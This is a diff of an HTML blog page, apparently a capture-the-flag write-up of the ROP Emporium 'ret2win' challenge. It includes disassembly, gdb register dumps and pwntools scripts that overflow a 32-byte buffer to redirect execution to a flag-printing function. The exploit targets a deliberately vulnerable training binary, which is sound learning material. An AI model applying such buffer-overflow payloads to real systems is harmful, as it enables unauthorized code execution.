@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-11-01 Tue 12:42 -->
+<!-- 2022-12-09 Fri 13:37 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>ROPemporium | ret2win</title>
-<meta name="author" content="Main user for my machines" />
+<meta name="author" content="C3lphie" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script>
@@ -185,7 +185,7 @@ The more you know about the target, the easier it will be to model an attack tow
 <p>
 The first thing you should do with any compiled binary that you want to pwn(professionel language for defeating security), is to run the <code>file</code> command on the the binary.<br>
 </p>
-<pre class="example" id="org351675d">
+<pre class="example" id="org90ae6d5">
 ┌────[~/ha/bi/ropemporium/ret2win on  master [?]
 └─&gt;file ret2win
 ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
@@ -208,7 +208,7 @@ It also means symbols are left in so we can see function names.<br>
 After looking at what <code>file</code> gives outputs, the next nifty tool we should use is: <code>checksec</code>.<br>
 It is a part of <code>pwntools</code>, <a href="https://github.com/Gallopsled/pwntools">a CTF framework and exploit development library</a>, and can tell us about what kind of security measures that the binary is compiled with.<br>
 </p>
-<pre class="example" id="org7255893">
+<pre class="example" id="orgd690f8f">
 ┌────[~/ha/bi/ropemporium/ret2win on  master [?]
 └─&gt;checksec ret2win
 [*] '/home/c3lphie/hacking/binary_exploitation/ropemporium/ret2win/ret2win'
@@ -257,25 +257,25 @@ But use what-ever you're most comfortable in, and if you don't have the economy 
 <h4 id="org776d32d"><span class="section-number-4">2.3.1.</span> Main function</h4>
 <div class="outline-text-4" id="text-2-3-1">
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 1: </span>main function disassembled</label><pre class="src src-asm">push    rbp {__saved_rbp}
-mov     rbp, rsp {__saved_rbp}
-mov     rax, qword [rel stdout]
-mov     ecx, 0x0
-mov     edx, 0x2
-mov     esi, 0x0
-mov     rdi, rax
-call    setvbuf
-mov     edi, 0x400808  {"ret2win by ROP Emporium"}
-call    puts
-mov     edi, 0x400820  {"x86_64\n"}
-call    puts
-mov     eax, 0x0
-call    pwnme
-mov     edi, 0x400828  {"\nExiting"}
-call    puts
-mov     eax, 0x0
-pop     rbp {__saved_rbp}
-retn     {__return_addr}
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>main function disassembled</label><pre class="src src-asm"><span class="org-function-name">push</span>    <span class="org-keyword">rbp</span> {__saved_rbp}
+<span class="org-function-name">mov</span>     <span class="org-keyword">rbp</span>, rsp {__saved_rbp}
+<span class="org-function-name">mov</span>     <span class="org-keyword">rax</span>, qword [rel stdout]
+<span class="org-function-name">mov</span>     <span class="org-keyword">ecx</span>, 0x0
+<span class="org-function-name">mov</span>     <span class="org-keyword">edx</span>, 0x2
+<span class="org-function-name">mov</span>     <span class="org-keyword">esi</span>, 0x0
+<span class="org-function-name">mov</span>     <span class="org-keyword">rdi</span>, rax
+<span class="org-function-name">call</span>    <span class="org-keyword">setvbuf</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x400808  {<span class="org-string">"ret2win by ROP Emporium"</span>}
+<span class="org-function-name">call</span>    <span class="org-keyword">puts</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x400820  {<span class="org-string">"x86_64\n"</span>}
+<span class="org-function-name">call</span>    <span class="org-keyword">puts</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">eax</span>, 0x0
+<span class="org-function-name">call</span>    <span class="org-keyword">pwnme</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x400828  {<span class="org-string">"\nExiting"</span>}
+<span class="org-function-name">call</span>    <span class="org-keyword">puts</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">eax</span>, 0x0
+<span class="org-function-name">pop</span>     <span class="org-keyword">rbp</span> {__saved_rbp}
+<span class="org-function-name">retn</span>     {__return_addr}
 </pre>
 </div>
 <p>
@@ -289,33 +289,33 @@ So let's take a look at that instead shall we?<br>
 <h4 id="orgaeaee34"><span class="section-number-4">2.3.2.</span> pwnme function</h4>
 <div class="outline-text-4" id="text-2-3-2">
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 2: </span>pwnme function disassembled</label><pre class="src src-asm">push    rbp {__saved_rbp}
-mov     rbp, rsp {__saved_rbp}
-sub     rsp, 0x20
-lea     rax, [rbp-0x20 {var_28}]
-mov     edx, 0x20
-mov     esi, 0x0
-mov     rdi, rax {var_28}
-call    memset
-mov     edi, 0x400838  {"For my first trick, I will attem…"}
-call    puts
-mov     edi, 0x400898  {"What could possibly go wrong?"}
-call    puts
-mov     edi, 0x4008b8  {"You there, may I have your input…"}
-call    puts
-mov     edi, 0x400918
-mov     eax, 0x0
-call    printf
-lea     rax, [rbp-0x20 {var_28}]
-mov     edx, 0x38
-mov     rsi, rax {var_28}
-mov     edi, 0x0
-call    read
-mov     edi, 0x40091b  {"Thank you!"}
-call    puts
-nop     
-leave    {__saved_rbp}
-retn     {__return_addr}
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>pwnme function disassembled</label><pre class="src src-asm"><span class="org-function-name">push</span>    <span class="org-keyword">rbp</span> {__saved_rbp}
+<span class="org-function-name">mov</span>     <span class="org-keyword">rbp</span>, rsp {__saved_rbp}
+<span class="org-function-name">sub</span>     <span class="org-keyword">rsp</span>, 0x20
+<span class="org-function-name">lea</span>     <span class="org-keyword">rax</span>, [rbp-0x20 {var_28}]
+<span class="org-function-name">mov</span>     <span class="org-keyword">edx</span>, 0x20
+<span class="org-function-name">mov</span>     <span class="org-keyword">esi</span>, 0x0
+<span class="org-function-name">mov</span>     <span class="org-keyword">rdi</span>, rax {var_28}
+<span class="org-function-name">call</span>    <span class="org-keyword">memset</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x400838  {<span class="org-string">"For my first trick, I will attem&#8230;"</span>}
+<span class="org-function-name">call</span>    <span class="org-keyword">puts</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x400898  {<span class="org-string">"What could possibly go wrong?"</span>}
+<span class="org-function-name">call</span>    <span class="org-keyword">puts</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x4008b8  {<span class="org-string">"You there, may I have your input&#8230;"</span>}
+<span class="org-function-name">call</span>    <span class="org-keyword">puts</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x400918
+<span class="org-function-name">mov</span>     <span class="org-keyword">eax</span>, 0x0
+<span class="org-function-name">call</span>    <span class="org-keyword">printf</span>
+<span class="org-function-name">lea</span>     <span class="org-keyword">rax</span>, [rbp-0x20 {var_28}]
+<span class="org-function-name">mov</span>     <span class="org-keyword">edx</span>, 0x38
+<span class="org-function-name">mov</span>     <span class="org-keyword">rsi</span>, rax {var_28}
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x0
+<span class="org-function-name">call</span>    <span class="org-keyword">read</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x40091b  {<span class="org-string">"Thank you!"</span>}
+<span class="org-function-name">call</span>    <span class="org-keyword">puts</span>
+<span class="org-function-name">nop</span>     
+<span class="org-function-name">leave</span>    {__saved_rbp}
+<span class="org-function-name">retn</span>     {__return_addr}
 </pre>
 </div>
 
@@ -324,14 +324,14 @@ Since this is the function, which should be pwned, lets take a closer look using
 I know I shouldn't rely on it, but I'm still learning so yeah.<br>
 </p>
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 3: </span>pwnme function HLIL</label><pre class="src src-c">void var_28
+<label class="org-src-name"><span class="listing-number">Listing 3: </span>pwnme function HLIL</label><pre class="src src-c"><span class="org-type">void</span> <span class="org-function-name">var_28</span>
 memset(&amp;var_28, 0, 0x20)
-puts(str: "For my first trick, I will attem…")
-puts(str: "What could possibly go wrong?")
-puts(str: "You there, may I have your input…")
-printf(format: data_400918)
-read(fd: 0, buf: &amp;var_28, nbytes: 0x38)
-return puts(str: "Thank you!")
+<span class="org-function-name">puts</span>(str: <span class="org-string">"For my first trick, I will attem&#8230;"</span>)
+<span class="org-function-name">puts</span>(str: <span class="org-string">"What could possibly go wrong?"</span>)
+<span class="org-function-name">puts</span>(str: <span class="org-string">"You there, may I have your input&#8230;"</span>)
+<span class="org-function-name">printf</span>(format: data_400918)
+<span class="org-function-name">read</span>(fd: 0, buf: &amp;var_28, nbytes: 0x38)
+<span class="org-keyword">return</span> puts(str: <span class="org-string">"Thank you!"</span>)
 </pre>
 </div>
 
@@ -339,14 +339,14 @@ return puts(str: "Thank you!")
 Let's clean it up a bit for easier understanding:<br>
 </p>
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 4: </span>pwnme function HLIL with var names</label><pre class="src src-c">void buffer
+<label class="org-src-name"><span class="listing-number">Listing 4: </span>pwnme function HLIL with var names</label><pre class="src src-c"><span class="org-type">void</span> <span class="org-function-name">buffer</span>
 memset(&amp;buffer, 0, 32)
-puts(str: "For my first trick, I will attem…")
-puts(str: "What could possibly go wrong?")
-puts(str: "You there, may I have your input…")
-printf(format: data_400918)
-read(fd: 0, buf: &amp;buffer, nbytes: 56)
-return puts(str: "Thank you!")
+<span class="org-function-name">puts</span>(str: <span class="org-string">"For my first trick, I will attem&#8230;"</span>)
+<span class="org-function-name">puts</span>(str: <span class="org-string">"What could possibly go wrong?"</span>)
+<span class="org-function-name">puts</span>(str: <span class="org-string">"You there, may I have your input&#8230;"</span>)
+<span class="org-function-name">printf</span>(format: data_400918)
+<span class="org-function-name">read</span>(fd: 0, buf: &amp;buffer, nbytes: 56)
+<span class="org-keyword">return</span> puts(str: <span class="org-string">"Thank you!"</span>)
 </pre>
 </div>
 
@@ -360,8 +360,8 @@ But how should we control the stack?<br>
 Well if you look at the last two lines of the disassembly version of <code>pwnme</code><br>
 </p>
 <div class="org-src-container">
-<pre class="src src-asm">leave    {__saved_rbp}
-retn     {__return_addr}
+<pre class="src src-asm"><span class="org-function-name">leave</span>    {__saved_rbp}
+<span class="org-function-name">retn</span>     {__return_addr}
 </pre>
 </div>
 <p>
@@ -374,15 +374,15 @@ If we somehow managed to overwrite <code>__return_addr</code> we potentially hav
 <h4 id="org4392811"><span class="section-number-4">2.3.3.</span> ret2win function</h4>
 <div class="outline-text-4" id="text-2-3-3">
 <div class="org-src-container">
-<label class="org-src-name"><span class="listing-number">Listing 5: </span>ret2win function disassembled</label><pre class="src src-asm">push    rbp {__saved_rbp}
-mov     rbp, rsp {__saved_rbp}
-mov     edi, 0x400926  {"Well done! Here's your flag:"}
-call    puts
-mov     edi, 0x400943  {"/bin/cat flag.txt"}
-call    system
-nop     
-pop     rbp {__saved_rbp}
-retn     {__return_addr}
+<label class="org-src-name"><span class="listing-number">Listing 5: </span>ret2win function disassembled</label><pre class="src src-asm"><span class="org-function-name">push</span>    <span class="org-keyword">rbp</span> {__saved_rbp}
+<span class="org-function-name">mov</span>     <span class="org-keyword">rbp</span>, rsp {__saved_rbp}
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x400926  {<span class="org-string">"Well done! Here's your flag:"</span>}
+<span class="org-function-name">call</span>    <span class="org-keyword">puts</span>
+<span class="org-function-name">mov</span>     <span class="org-keyword">edi</span>, 0x400943  {<span class="org-string">"/bin/cat flag.txt"</span>}
+<span class="org-function-name">call</span>    <span class="org-keyword">system</span>
+<span class="org-function-name">nop</span>     
+<span class="org-function-name">pop</span>     <span class="org-keyword">rbp</span> {__saved_rbp}
+<span class="org-function-name">retn</span>     {__return_addr}
 </pre>
 </div>
 <p>
@@ -418,7 +418,7 @@ But the <code>read</code> function can read up to 56 bytes into the buffer.<br>
 <p>
 So lets see what happen if we put a bunch of data into the buffer!<br>
 </p>
-<pre class="example" id="org98fdddc">
+<pre class="example" id="orgae9e1f8">
 ┌────[~/ha/bi/ropemporium/ret2win on  master [?]
 └─&gt;./ret2win
 ret2win by ROP Emporium
@@ -446,7 +446,7 @@ And a couple of instructions before the <code>read</code> call.<br>
 <p>
 If we look at the registers before <code>read</code>.<br>
 </p>
-<pre class="example" id="org5dfcc7e">
+<pre class="example" id="orgc820dc0">
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ────────────────────────────────────────────────────────────────────────────────────────── registers ────
 $rax   : 0x2
@@ -482,7 +482,7 @@ When returning from a function, we will land where <code>$rbp</code> points to.<
 <p>
 So lets crash this program!<br>
 </p>
-<pre class="example" id="orgcc3ff59">
+<pre class="example" id="orge88f557">
 gef➤  run
 Starting program: /home/c3lphie/hacking/binary_exploitation/ropemporium/ret2win/ret2win
 ret2win by ROP Emporium
@@ -502,7 +502,7 @@ Don't mind the gef➤ prompt, that is just a gdb extension which makes exploit d
 <p>
 Below you can see the content of the registers after the crash.<br>
 </p>
-<pre class="example" id="orga921085">
+<pre class="example" id="orgbfd110a">
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ────────────────────────────────────────────────────────────────────────────────────────── registers ────
 $rax   : 0xb
@@ -543,19 +543,19 @@ Using cyclic patterns, we can relatively easy find the padding length of our pay
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python">from pwn import *
+<pre class="src src-python"><span class="org-py-import-from">from</span> pwn <span class="org-py-import-from">import</span> *
 
-context.update(arch="amd64", os="linux")
-proc = process("./ret2win")
-gdb.attach(proc, """
-b pwnme""")
+context.update(arch=<span class="org-string">"amd64"</span>, os=<span class="org-string">"linux"</span>)
+<span class="org-py-variable-name">proc</span> = process(<span class="org-string">"./ret2win"</span>)
+gdb.attach(proc, <span class="org-string">"""</span>
+<span class="org-string">b pwnme"""</span>)
 
-def send_recv(buffer: bytes):
-    proc.recvuntil(b"&gt;")
-    proc.sendline(buffer)
-    return proc.recvline()
+<span class="org-py-def-class">def</span> <span class="org-py-def">send_recv</span>(<span class="org-py-builtins">buffer</span>: <span class="org-py-builtins">bytes</span>):
+    proc.recvuntil(b<span class="org-string">"&gt;"</span>)
+    proc.sendline(<span class="org-py-builtins">buffer</span>)
+    <span class="org-keyword">return</span> proc.recvline()
 
-payload = cyclic(56)
+<span class="org-py-variable-name">payload</span> = cyclic(<span class="org-py-number">56</span>)
 
 send_recv(payload)
 proc.interactive()
@@ -570,7 +570,7 @@ Which we can use to find our padding length<br>
 <p>
 The above script also attaches gdb, so we can find the pattern in the registers and use that in our exploit.<br>
 </p>
-<pre class="example" id="org0a9d232">
+<pre class="example" id="org5d412f6">
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ────────────────────────────────────────────────────────────────────────────────────────── registers ────
 $rax   : 0xb
@@ -600,20 +600,20 @@ If we use the function <code>cyclic_find</code> in conjunction with <code>cyclic
 </p>
 
 <div class="org-src-container">
-<pre class="src src-python">from pwn import *
+<pre class="src src-python"><span class="org-py-import-from">from</span> pwn <span class="org-py-import-from">import</span> *
 
-context.update(arch="amd64", os="linux")
-proc = process("./ret2win")
-gdb.attach(proc, """
-b pwnme""")
+context.update(arch=<span class="org-string">"amd64"</span>, os=<span class="org-string">"linux"</span>)
+<span class="org-py-variable-name">proc</span> = process(<span class="org-string">"./ret2win"</span>)
+gdb.attach(proc, <span class="org-string">"""</span>
+<span class="org-string">b pwnme"""</span>)
 
-def send_recv(buffer: bytes):
-    proc.recvuntil(b"&gt;")
-    proc.sendline(buffer)
-    return proc.recvline()
+<span class="org-py-def-class">def</span> <span class="org-py-def">send_recv</span>(<span class="org-py-builtins">buffer</span>: <span class="org-py-builtins">bytes</span>):
+    proc.recvuntil(b<span class="org-string">"&gt;"</span>)
+    proc.sendline(<span class="org-py-builtins">buffer</span>)
+    <span class="org-keyword">return</span> proc.recvline()
 
-payload = cyclic(cyclic_find(0x61616169))
-payload += p64(0xdeadbeefcafebabe)
+<span class="org-py-variable-name">payload</span> = cyclic(cyclic_find(0x61616169))
+<span class="org-py-variable-name">payload</span> += p64(0xdeadbeefcafebabe)
 
 send_recv(payload)
 proc.interactive()
@@ -624,7 +624,7 @@ If we concentrate on the payload, we see that we first calculate our padding.<br
 After that we add <code>0xdeadbeecafebabe</code> to ensure that we indeed do have control over <code>$rbp</code>.<br>
 </p>
 
-<pre class="example" id="orga95f644">
+<pre class="example" id="orgd41c16a">
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ────────────────────────────────────────────────────────────────────────────────────────── registers ────
 $rax   : 0xb
@@ -691,22 +691,22 @@ Since we already know which function we need to execute, and the binary doesn't 
 So know that we have control over the base pointer let's make it point towards <code>ret2win</code> and finish this challenge.<br>
 </p>
 <div class="org-src-container">
-<pre class="src src-python">from pwn import *
+<pre class="src src-python"><span class="org-py-import-from">from</span> pwn <span class="org-py-import-from">import</span> *
 
-context.update(arch="amd64", os="linux")
-proc = process("./ret2win")
+context.update(arch=<span class="org-string">"amd64"</span>, os=<span class="org-string">"linux"</span>)
+<span class="org-py-variable-name">proc</span> = process(<span class="org-string">"./ret2win"</span>)
 
-def send_recv(buffer: bytes):
-    proc.recvuntil(b"&gt;")
-    proc.sendline(buffer)
-    return proc.recvline()
-
-
-ret2win_addr = 0x400756
+<span class="org-py-def-class">def</span> <span class="org-py-def">send_recv</span>(<span class="org-py-builtins">buffer</span>: <span class="org-py-builtins">bytes</span>):
+    proc.recvuntil(b<span class="org-string">"&gt;"</span>)
+    proc.sendline(<span class="org-py-builtins">buffer</span>)
+    <span class="org-keyword">return</span> proc.recvline()
 
 
-payload = cyclic(cyclic_find(0x6161616B))
-payload += p64(ret2win_addr)
+<span class="org-py-variable-name">ret2win_addr</span> = 0x400756
+
+
+<span class="org-py-variable-name">payload</span> = cyclic(cyclic_find(0x6161616B))
+<span class="org-py-variable-name">payload</span> += p64(ret2win_addr)
 
 send_recv(payload)
 proc.interactive()
@@ -716,7 +716,7 @@ proc.interactive()
 As you can see instead of <code>0xdeadbeefcafebabe</code> we just use <code>ret2win_addr</code>.<br>
 And if we run the script:<br>
 </p>
-<pre class="example" id="org1fee54d">
+<pre class="example" id="org20bd86c">
 ┌────[~/ha/bi/ropemporium/ret2win on  master [?]
 └─&gt;python exploit.py
 [+] Starting local process './ret2win': pid 170719
